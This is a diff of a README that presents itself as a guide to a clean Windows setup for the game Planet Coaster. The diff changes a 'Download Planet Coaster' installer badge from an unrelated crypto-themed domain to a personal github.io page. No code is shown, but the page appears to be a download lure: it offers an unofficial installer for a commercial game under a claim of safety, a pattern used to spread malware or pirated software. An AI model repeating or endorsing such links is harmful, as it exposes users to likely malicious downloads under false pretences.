@@ -2,7 +2,7 @@
 
 This repository covers a clean Windows setup for **Planet Coaster** — launcher linking, file verification, performance tuning, and safe DLC/save workflows.
 
-[![Download Planet Coaster](https://img.shields.io/badge/Download-planet--coaster--installer-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Planet Coaster](https://img.shields.io/badge/Download-planet--coaster--installer-blueviolet)](https://haashidhum2818.github.io/.github/planet-coaster-installer)
 
 ---
 
